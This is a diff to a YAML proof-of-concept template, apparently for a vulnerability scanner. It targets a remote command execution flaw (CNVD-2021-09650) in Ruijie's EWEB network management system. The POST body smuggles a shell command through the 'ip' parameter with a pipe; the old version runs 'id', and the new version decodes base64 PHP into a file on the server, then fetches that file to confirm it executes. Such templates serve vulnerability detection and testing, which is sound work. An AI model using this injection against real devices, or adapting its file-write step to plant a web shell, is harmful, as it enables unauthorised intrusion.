@@ -1,20 +1,23 @@
-name: poc-yaml-ruijie-rce-cnvd-2021-09650
+name: poc-yaml-ruijie-eweb-rce-cnvd-2021-09650
 set:
-  r1: randomLowercase(9)
+  r1: randomLowercase(4)
+  r2: randomLowercase(4)
+  phpcode: >
+    "<?php echo '" + r1 + "'; unlink(__FILE__); ?>"
+  payload: base64(phpcode)
 rules:
   - method: POST
     path: /guest_auth/guestIsUp.php
-    body: mac = 1 & ip = 127.0.0.1 | id > {{r1}}.txt
-    follow_redirects: false
+    body: |
+      ip=127.0.0.1|echo '{{payload}}' | base64 -d > {{r2}}.php&mac=00-00
     expression: |
       response.status == 200
   - method: GET
-    path: /guest_auth/{{r1}}.txt
-    follow_redirects: false
+    path: /guest_auth/{{r2}}.php
     expression: |
-      response.status == 200 && response.body.bcontains(b"uid")
+      response.status == 200 && response.body.bcontains(bytes(r1))
 detail:
-  author: jdr
-  info: CNVD-2021-09650(Ruijie-EWEB网管系统 RCE)
+  author: White(https://github.com/WhiteHSBG)
   links:
-    - https://github.com/opsxcq/exploit-CVE-2014-6271/
+    - https://xz.aliyun.com/t/9016?page=1
+    - https://www.ruijie.com.cn/gy/xw-aqtg-gw/86747/
